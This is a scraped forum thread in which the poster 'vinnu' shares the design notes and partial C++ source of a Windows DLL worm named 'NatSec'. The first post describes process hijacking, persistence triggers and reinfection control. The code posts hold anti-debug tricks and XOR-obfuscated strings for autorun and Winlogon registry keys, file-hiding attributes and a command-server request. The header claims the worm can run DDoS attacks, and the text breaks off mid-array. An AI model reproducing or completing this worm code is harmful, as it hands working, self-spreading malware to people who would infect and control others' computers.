+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+				<h2 class="title icon">
+					NatSec worm Source code --- Lets discus...&quot;vinnu&quot;
+				</h2>
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_961">
+						<blockquote class="postcontent restore ">
+							Author : &quot;vinnu&quot;<br />
+Developer : &quot;vinnu&quot;<br />
+Team : Legion Of Xtremers<br />
+Year : 2006-2007<br />
+IDE : VC++ 6.0<br />
+Type : win32.dll layer worm<br />
+Damage : None, rather has performance boosters<br />
+<br />
+NatSec (project name) worm was my one of most interestign and efficient worms in the past with its infections in nearly every continent but in very secret manner and very few.<br />
+I m going to reveal its diminished (trimmed) varient for educational purpose with most of its functionality removed, but still can do enough infections.<br />
+<br />
+It does not damage any data or system resources. Even the cpu and memory utilization is very carefully controlled to keep the system running smoothely.<br />
+<br />
+The infected system started to talk in PAHARI language but intelligently they keep quite when the sysop listens music or watches movies.<br />
+This worm was developed using fusion technique, i mean by fusing several techniques, like it was developed in c but it had vbs modules too.<br />
+<br />
+Now let us discus the prerequisites of a worm structure, which are most essential for an artificial life.<br />
+<br />
+A typical worm structure:<br />
+<br />
+1. Main circuit - This circuit is responsible for controlling all the activities of different modules. This circuit makes sure which module should be fired at exactly what time and whether is the fired module properly executed.<br />
+<br />
+Note: Some worms do not let other clones of itself to be executed on same prey. So the main circuit takes care of that, in several ways: in one technique the older executing sibling checks for the reinfection and destroys the reinfecting routines, in another the youngest sibling kills the older (elder) already executing clones. But in case of scattered  tentacles in several other prey processes (hijacked processes) the later technique is not reliable and is difficult to implement as it may destabilize the system. So the first technique is used in which the main circuit takes care of the reinfection and kills it.<br />
+<br />
+Important note: All my other worms too behaved in similar manner. All this stuff and techniques are  the general properties and behaviours exhibited by my worms and i am not discussing the behaviours of other's artificial lives every artificial life developer has his own recipe so don't blame me for other's techniques if they are different....&quot;vinnu&quot;<br />
+<br />
+The main circuit is also called as motherboard as analogous to hardware motherboard of any system.<br />
+<br />
+2. Displacement circuit:  This circuit is most important and cares for placing the necessary parts at their appropriate positions depending upon the privileges of the prey.<br />
+This circuit must execute in the first priority and before most other circuits, it is necessary to call this circuit from main (motherboard) circuit in multithreaded environment.<br />
+It will generate and place all the necessary modules at their proper places.<br />
+<br />
+3. Process hijacker : Being a dll layer worm, it is most necessary to hijack the victim system's appropriate processes and inject the required code into them. Every hijacked process will be zombied and will carry out a different and distinct activity.<br />
+<br />
+4. Auto trigger circuit: This is also one of the most important circuit. A worm with only this circuit is enough to survive in a single prey.<br />
+The auto trigger circuit actually a looped circuit which keeps on writing the triggers which are responsible for triggering the worm trigger file at the time of system restart.<br />
+<br />
+Note: All loops (worms have 99% indefinite/infinite loops) must have sleep times into them, otherwise the system will get unresponsive soon. this is most avoidable situation.<br />
+<br />
+The sleep time must be chosen in such a way that it doesn't clog up the cpu and not so much to even defeat it from a simple command consoles for loop to defeat the worm.<br />
+<br />
+5. Feedback circuit:  ..............................................
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by b0nd; 09-16-2010 at <span class="time">06:48 PM</span>.
+					
+					
+						<span class="reason">Reason:</span> Merged
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_961" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_961" class="newreply" href="newreplybfd2.html?do=newreply&amp;p=961" rel="nofollow" title="Reply With Quote"><img id="quoteimg_961" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_971">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:41 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post971" href="showthreadadd3.html?t=333&amp;p=971&amp;viewfull=1#post971" class="postcounter">#2</a><a id="postcount971" name="2"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_971_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+				<h2 class="title icon">
+					Sorce code of worm
+				</h2>
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_971">
+						<blockquote class="postcontent restore ">
+							// NatSec.cpp	: Defines the entry point for the DLL worm Retaliator.<br />
+// Essential	: WarheaD Should be able to generate an executable or trigger file on its own.<br />
+<br />
+/***[+]<br />
+      * developer	: &quot;vinnu&quot;<br />
+      * team		: LOX (The Legion Of Xtremers)<br />
+      * capability	: Extended capabilities in this version have been limited<br />
+    			      for security reasons, capable of performing the DDOS attacks.<br />
+      * performance : Care has been taken to avoid the cpu, memory &amp; other resource<br />
+				      consumption during native processing (The processing of other programs)<br />
+				      Fixes some security issues and optimizes the cpu &amp; memory performance.<br />
+      *<br />
+      ***/<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">#include &quot;stdafx.h&quot;
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;direct.h&gt;
+#include &lt;TlHelp32.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;shellapi.h&gt;
+/*--------------MACRO SPACE---------------*/
+#define IPSZ 17
+#define KEYSZ 65
+#define MEDBUFSIZE 257
+#define MINBUFSIZE 129
+#define MAXBUFSIZE 65537
+
+#define MININTERVAL 64
+#define SHORTINTERVAL 24		//
+#define MEDINTERVAL 256			// Time intervals for sustained delay
+#define MAXINTERVAL 512			//
+#define THRDINTERVAL 10000		// Thread wait interval
+#define SMAXINTERVAL 640000		// 640 seconds
+#define HINTERVAL 3600000		// 1 hour
+
+#define FILEATTRIB 39			// Setting atributes to the SuperHidden state.
+#define FILEATTRIBW 38 //34		// Setting attributes to the Hidden+Writable state.
+#define FILEATTRIBL 34
+#define FILEUNATTRIB 32			// Recovering to normal state.
+#define FILEATTRIBAR 33			// Archive + read-only state.
+#define DIRATTRIB 54			// Directory with all attributes set.
+#define DIRUNATTRIB 16			// Just a directory.
+
+#define PORT 80						// Server port
+
+#pragma comment(lib, &quot;ws2_32.lib&quot;)
+
+////-----------Global Shared memory section among different processes:-circuit----------////
+#pragma data_seg (&quot;.LOXians&quot;)
+	bool nebelwerfer = false;
+	int intLoaded = 0;
+	int iscout = 0; //used for scoutThreads iteration;
+	char developer[] = &quot;\&quot;vinnu\&quot; The LOXian (Legion Of Xtremers)&quot;;
+#pragma data_seg()
+////---------Global Shared memory section among different processes:-circuit end--------////
+char SERVERWARHEAD[] = &quot;127.0.0.1&quot;;	// Server address, Do not Remove it even if scramble present.
+char SERVERNAME[] = &quot;loxians.net&quot;;			// Server name
+
+char INTERNALPATH[] = &quot;\\NatSec.dll&quot;;
+char INTERNALNAME[] = &quot;NatSec.dll&quot;;
+char DIRPATH[] = &quot;\\NatSec&quot;;
+char DIRTERT[] = &quot;\\Application Data\\WinNT&quot;;
+char TERT[] = &quot;\\WinNTsec.dll&quot;;
+char INTDIRPATH[] = &quot;\\Documents\\NatSec&quot;;
+char DIRNAME[] = &quot;NatSec&quot;;
+char PACKFILE[] = &quot;packQCP.lnk&quot;;
+/*--------------Global Section------------*/
+HANDLE hProcess = NULL;
+HANDLE hSnapshot = NULL;
+HANDLE hmThread = NULL;
+HANDLE scoutThreads[MININTERVAL];
+char primepath[MEDBUFSIZE], currentpath[MEDBUFSIZE];
+char primepathap[MEDBUFSIZE + IPSZ], currentpathap[MEDBUFSIZE + IPSZ], scrsav[MEDBUFSIZE + IPSZ], saverptr[MEDBUFSIZE], tertiaryap[MEDBUFSIZE + IPSZ];
+char lfailsafe[MEDBUFSIZE + IPSZ], seddir[MEDBUFSIZE + IPSZ], targetfile[MEDBUFSIZE], winbuf[MEDBUFSIZE + KEYSZ];;
+char datapacket[MAXBUFSIZE];
+char *warkeys[KEYSZ], *warcrypt[KEYSZ];
+char *plainbuffer[92];  // Plaintext buffer.
+char *requestStr = plainbuffer[10];/*&quot;GET /lox/nxgis/qproto.txt HTTP/1.0\r\n&quot;\
+				   &quot;Content-Type: text/plain\r\n\r\n&quot;;	// The Query string*/
+char retr[25];		// The retrieved checksum, right after the packet arrives
+char chksm[25];		// The checksum retrieved from the datapacket file.
+unsigned short check = 0;	// The checksum to be calculated.
+bool nebel = false;			// winlogon notify circuit needs it. Will be used to terminate the loops. Do not define in shared block.
+/*----------------------------------------*/
+using namespace std;
+//-----Definition block----//
+HANDLE processStarter(LPCTSTR appname, LPTSTR cmdline);
+void cdcryptor(char **crinBuffer);
+unsigned int randNS();
+void controlsp();
+void traceLeaver();
+void privilAdj();
+void spvoice();
+void cruser();
+void sed(char *sourcedir);
+//---Definition block end--//</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">11:05 PM</span>.
+					
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_971" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_971" class="newreply" href="newreplye8f2.html?do=newreply&amp;p=971" rel="nofollow" title="Reply With Quote"><img id="quoteimg_971" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_972">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:43 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post972" href="showthread332b.html?t=333&amp;p=972&amp;viewfull=1#post972" class="postcounter">#3</a><a id="postcount972" name="3"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_972_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_972">
+						<blockquote class="postcontent restore ">
+							<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">BOOL warkeyInit()	{
+try	{					// anti-debug circuit.
+	int x = 0, y = 110;
+	y = y/x;
+} catch (...)	{
+	char *plainbuffer[91];
+	warkeys[0] = &quot;\xdb\xb1\xb3\xab\xab\x8a\xd4\xb1\xb8\xad\xbf\xac\xaa\x8d\xbf\xae\xa7\x9f\xe3\xaf\xb8\xd1\x98\xd5\xdf\x93&quot;;
+	warkeys[1] = &quot;\xdf\xaa\xde\xad\xfd\xfa\x9d\xe5\x9f\x9c\xda\x9d\xf7\xcb\xdf\xb8\xad\xbf\xec\x8c\xac\xcd\xb9\xef\xd7\xfd&quot;;
+	warkeys[2] = &quot;\xcf\xac\xaa\x8d\xd8\x97\xed\xe4\xcd\x84\xa2\xa9\xc7\xa0\xb3\x9e\x94\xfa\xfc\xac\xbf\xac\xaa\x8d\xd9\xf4&quot;;
+	warkeys[3] = &quot;\xbb\x9c\x8c\xcd\xb9\xc1\xa3\xee\x8d\xb1\x9c\xca\xee\x9a\x9f\x8a\xe5\xdc\xeb\x8c\xac\xdd\xb5\xef\xa3\xc6&quot;;
+	warkeys[4] = &quot;\xcb\xb0\xb3\xac\xdd\x8d\xd8\xb3\xbd\xcf\xcc\xda\xb3\x8c\xac\xce\xb8\xdf\xee\xad\xbf\xb8\xc7\xd8\xcd\x99&quot;;
+	warkeys[5] = &quot;\xff\xae\x9e\xae\xb3\xe9\xaf\xee\xaf\xea\x9d\xe5\xac\xac\x9b\xee\xe9\xda\x9d\xb1\xac\x9d\xa4\xb6\xa7\xb1&quot;;
+	warkeys[6] = &quot;\xe9\xc3\x82\xec\xdd\xcd\xab\xad\xea\xaf\xb8\xb3\xdd\xb7\x8c\xcd\xf6\xea\xe9\x8c\xac\xd7\x8c\xef\xd9\x9f&quot;;
+	warkeys[7] = &quot;\xf5\x9d\x87\xb1\xd8\xd8\xde\x9e\x9a\x89\x8c\xee\x9c\xfd\xea\x9d\xe5\x8f\xfd\xea\x9d\xe5\x98\xe9\xb6\xf8&quot;;
+	warkeys[8] = &quot;\xae\xe9\x96\xac\xdd\xaa\xf5\xce\xa3\xcf\xfc\xcd\x8e\x84\x9c\x83\xd7\xce\xeb\x8c\xac\xdd\x9a\xec\xd7\xa7&quot;;
+	warkeys[9] = &quot;\xad\xbf\xac\xaa\x8d\xbf\xac\xda\x8d\xef\xdc\x9a\xcf\x98\xb1\xad\xa4\xf4\xeb\x8c\xb8\xad\x99\xef\x96\xb3&quot;;
+	warkeys[10] = &quot;\xea\xd4\xfe\xb1\xdd\xcd\xdc\xe9\xad\xb3\xac\xaf\x8d\xbc\x87\x8e\x9a\xd1\xcb\x8c\xac\xdc\x9d\xef\x89\xe7&quot;;
+	warkeys[11] = &quot;\xb1\xf4\x8c\xbc\xd8\xdf\xb1\xb1\xb3\xa1\xbf\xac\xa5\x8d\x93\xdd\x89\xee\xe8\x8c\xac\xfd\xea\x9d\xe5\xb6&quot;;
+	warkeys[12] = &quot;\x90\xb3\xdf\xde\xad\xed\xb3\xe3\xad\xb3\xe9\xa8\x8d\xbc\xaf\xda\xb1\xad\x9b\xad\x8c\xed\x9d\xdf\xca\xa4&quot;;
+	warkeys[13] = &quot;\xde\xea\x9d\xe5\x8d\xb1\xd9\xae\x9d\xd8\xac\xba\xb3\xa5\xd5\xd8\x9f\xda\xe9\xd8\xa3\xad\xaf\xe8\xad\xc0&quot;;
+	warkeys[14] = &quot;\xcf\x9c\x8e\xaf\xdd\xfd\xea\x9d\xe5\xbf\xa9\xd8\x88\xdf\xf2\x9e\xff\x95\xeb\x8c\x9d\x92\xcd\x8f\xd3\xe9&quot;;
+	warkeys[15] = &quot;\xd8\x94\x89\xac\xdd\x9a\xdf\xe2\xaa\x86\x8c\xb1\x9d\xbc\x8f\x86\xdc\xb8\x9f\xac\xaa\x8d\x9d\xef\xe7\xa4&quot;;
+	warkeys[16] = &quot;\x95\xfd\x9c\xb1\xdf\xde\xfc\xfd\x9a\x9c\xfd\xea\x9c\xfd\xea\x9d\xe5\xaa\xfd\xea\x99\xe5\x8a\xe9\xb6\xf8&quot;;
+	warkeys[17] = &quot;\xdf\xdf\x8f\xaa\x87\x9f\x9c\xd2\x87\x8f\xcf\x8a\xcf\x9f\xf1\xde\x9c\xfd\xef\x84\xac\xd4\x94\xef\xde\xb2&quot;;
+	warkeys[18] = &quot;\xa5\xa1\xe7\xb5\xd8\xd3\xb1\xea\xd0\xd1\x9c\xfd\xa7\x8d\xc7\xae\xb4\xd8\xd4\xde\x96\xf4\xea\x9d\xe6\xd0&quot;;
+	warkeys[19] = &quot;\x97\xda\x9f\xd5\xfa\x98\xa0\xd1\x82\x97\xf1\xb6\xf0\xfd\xa8\xf1\xc2\x8d\xcd\x8c\xac\xff\xc6\xa0\xb7\x84&quot;;
+	warkeys[20] = NULL;
+}
+return TRUE;
+}
+void cryptInit()	{
+try	{ int x = 64, y = 32, z = 128;
+	y = 256/(x - x)*(y - y)*(z - z);
+} catch(...)	{
+	plainbuffer[0] = &quot;\xEA\x83\x84\x85\x9B\xA4\xE4\x9F\x89&quot;;//&quot;127.0.0.1&quot;;//	SERVERWARHEAD[] = &quot;127.0.0.1&quot;;	// Server address
+	plainbuffer[1] = &quot;\xF0\xB5\xE5\x9E\xAA\xB1\xCB\x83\xD1\x89\xF8&quot;;//&quot;loxians.net&quot;;// SERVERNAME[] = &quot;loxians.net&quot;;
+	plainbuffer[2] = &quot;\xE3\xE2\xCB\xF9\x8A\x91\xD8\xB2\xE8\xA1\xD5&quot;;//&quot;\\NatSec.dll&quot;;// INTERNALPATH[] = &quot;\\NatSec.dll&quot;;
+	plainbuffer[3] = &quot;\xC3\xB9\xC7\xEE\xAA\xAF\xF4\xD7\xE0\xC0&quot;;//&quot;NatSec.dll&quot;;// INTERNALNAME[] = &quot;NatSec.dll&quot;;
+	plainbuffer[4] = &quot;\xB2\xA7\xBB\xE9\xE2\xC9\xFE&quot;;//&quot;\\NatSec&quot;;// DIRPATH[] = &quot;\\NatSec&quot;;
+	plainbuffer[5] = &quot;\xD0\xAE\xA9\xEF\x99\xF4\xE4\xD0\xAC\xB1\xB1\xF0\xBA\xCD\xED\x9A\xFD\xA1\xBD\xF4\x8B\xC1\xA9&quot;;//&quot;\\Application Data\\WinNT&quot;;// DIRTERT[] = &quot;\\Application Data\\WinNT&quot;;
+	plainbuffer[6] = &quot;\xD0\xFB\xB4\xF4\xA2\x83\xD4\xC8\xDC\x82\xCE\xE1\xD3&quot;;//&quot;\\WinNTsec.dll&quot;;	// TERT[] = &quot;\\WinNTsec.dll&quot;;
+	plainbuffer[7] = &quot;\x80\xAD\xC2\xD0\xD9\xC2\xE8\xD2\xF3\xFD\xC6\x9F\xAA\xF8\xFF\xB9\xFE&quot;;//&quot;\\Documents\\NatSec&quot;;// INTDIRPATH[] = &quot;\\Documents\\NatSec&quot;;
+	plainbuffer[8] = &quot;\xD3\x84\xC2\xC3\xD6\xBC&quot;;//&quot;NatSec&quot;;	// DIRNAME[] = &quot;NatSec&quot;;
+	plainbuffer[9] = &quot;\x95\xEC\xD2\xB2\xFF\xDE\x88\x82\xD6\xDD\xCE&quot;;// PACKFILE[] = &quot;packQCP.lnk&quot;;
+//----------under-construction-------------
+	plainbuffer[10] =&quot;\xB5\xDB\xAB\xB5\xC4\xE0\xF2\xEA\xE2\xE1\xAB\x8E\xB1\xE7\xA6\xDD\xAD\xE8&quot;\
+			 &quot;\xB0\x96\xC5\xA8\xF8\xC9\xE9\x9C\xC7\xD2\x88\xE8\xB0\x9D\x84\xBD\x97\xBA&quot;\
+			 &quot;\x94\xC1\xE7\xD0\xDD\xD6\xBA\xB0\x88\xC7\xBA\xCE\x98\x9E\xFD\x91\x83\xFC&quot;\
+			 &quot;\x91\xC5\x8F\xDB\xB7\xD5\x80\xAA\xD9\x96\xAB\xBA\xE1\xDE\xAA\xCB\xE5\xA2&quot;\
+			 &quot;\xE2\xB5\xEF\xFE\xAA\xE7\x85\xF1\xEC\x91\x8E\xED\xC2\xDE\x9E&quot;;
+			//&quot;GET /lox/nxgis/qproto.txt HTTP/1.0\nContent-Type: text/plain\n\n&quot;;	// *requestStr
+	plainbuffer[11] = &quot;\xEF\x83\xA4\xF6\xB6\xF6\xB4\x8E\xF7\xD2\xFF\xE6\xFB\x9D&quot;;//&quot;retaliator.dll&quot;;	// subkey
+	plainbuffer[12] = &quot;\xE1\xCF\xE3\xCA\xFD\xCF\xF0\x94\xEB\xDD\xBD\xF9\xAC&quot;;//&quot;MenuShowDelay&quot;;
+	plainbuffer[13] = &quot;\x84\x92\xA9\xD8\xDD\xEC\xAA\xF2\xB1\xA9\xA4\xE7\xD0\xC6\xB4\xCF\xD5\xEA&quot;\
+					  &quot;\xC8\xAD\x95\xC2\xDB\xC3\xDD\xFE\x85\xB7\xCE\xEE\xFE\xA8\xD7\xB5\xF5\x8B&quot;\
+					  &quot;\xFF\xC2\xF5\xA5\x80\xC6\xCF\xE5\x89\xB5\x88\xE5\xC9\xAE\xE9\xAA\xDB\xB6&quot;\
+					  &quot;\xA7\xDF\xC1\xC9\xAF&quot;;//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer&quot;; //subkey
+	plainbuffer[14] = &quot;\xA7\xC0\xAA\xDD\x83\xEB\x80\xF8\xD5\xEB\x8B\xA8\xAF\xE9\xDE\xFE\xE8\xCA&quot;;//&quot;NoDriveTypeAutoRun&quot;;
+	plainbuffer[15] = &quot;\xAC\xAC\xED\x87\xF8\xE9\xC5\x9B\xB7\xB0\xEA\xE8\xE6\xE0\xBD\xF9\x89\xB6&quot;\
+					  &quot;\xDE\x8A\xE1\x89\x98\xF2\x89\xC4\xBA\xD3\x8B\xDD\x80\xF9\xC2\xFD\xE7\x94&quot;\
+					  &quot;\xA0\xC2\xA8\x99\xBF\xD2\xC9\xF9\xEE\xB8\xBC\x92\xAC\xE1\xBC\xF4\x8D\xB0&quot;\
+					  &quot;\xC2\xC0\xDA\xC2\xDE&quot;;//&quot;CurrentControlSet\\Control\\Session Manager\\Memory Management&quot;; // subkey
+	plainbuffer[16] = &quot;\x99\xA4\xAF\x88\xCF\xDF\xC9\xFF\xEC\xDB\xEE\xE0\xFD\x94\xB3\xE9\xCF\xA9\xE9\x86\xFF\x82&quot;;//&quot;DisablePagingExecutive&quot;;
+	plainbuffer[17] = &quot;\xDC\xD2\xAD\xB9\xC8\xBE\xCA\x90\xD9\xD6\x84\xEB\xEC\xDF\xC7\xBF&quot;;//&quot;LargeSystemCache&quot;;
+	plainbuffer[18] = &quot;\xDC\xB5\x87\xAC\xD1\xC2\xC3\xC8\xFD\xA1\xA1\xF9\xE2\xF3\x99\x98&quot;\
+					  &quot;\x99\xF6\x91\xD0\xD9&quot;;//&quot;Control Panel\\Desktop&quot;; // fsubkey = &quot;Control Panel\\Desktop&quot;;
+	plainbuffer[19] = &quot;\xE2\xF2\xDA\xFB\xF1\xBD\xCA\xFA\xF0\xE7\xE4\xFE\x9D\x88\xD7\xFA\x9B\xE8&quot;\
+					  &quot;\xED\x88\xB7\x92\x99\xF5\xEB\x8E\xB6\xDF\x88\x98\xEF\x80\xC4\x89\xBC\xFC&quot;\
+					  &quot;\x97\xF9\x80\xD9\x96\x83\x9A\xF7\xDA\xEB\xF0\xEE\xB7\xF5\xD3\x8E\xEE\xB9&quot;\
+					  &quot;\xFE\x9F\xBD\xF9\x99&quot;;//&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced&quot;;// fsubkey1
+	plainbuffer[20] = &quot;\x87\x91\xD0\xA0\xBD\xDC\xB4\x95\xCB\x97\xF6\xB6\x88\xF7\xD3\xBE\xE4\xE3&quot;\
+					  &quot;\xAD\xE1\x99\x93\xCC\x9E\xB5\xFE\xED\xC2\xF8\xA3\x85\xD5\xC5\xF6\xBE\xDF&quot;\
+					  &quot;\xC7\xFD\xCE\xF8\xA7\xD8\xD7\xC3\xE3\xFB\xC3\xE3\xD3\xC1\xC0\xF0\x8D&quot;;//&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;; // shellsubkey
+	plainbuffer[21] = &quot;\xDF\xE3\x8B\xED\xB8\x96\xAF\x8A\xF0\xE7\xE4\xBB\xE5\x82\x97\xA2\xE2\xD6&quot;\
+					  &quot;\xF5\x90\xC9\xDD\xFA\xFB\x8D\x8F\x8C\xF1\xF8\xF6\xCE\xAC\x86\xC9\xF9\xE2&quot;\
+					  &quot;\xB9\xEF\xA4\xD1\x9D\xE4\xDE\xF2\x96\xB9\xF3\xF1\xE6\x8A\xBB\x84\xE2\xF0&quot;\
+					  &quot;\x8E\xC5\x8A\xC0\xAF\xAA\xDC\xF2\xCF\xBE\xE2\xAD\xDD\xC9\xBC\x90\x8F\xC0&quot;\
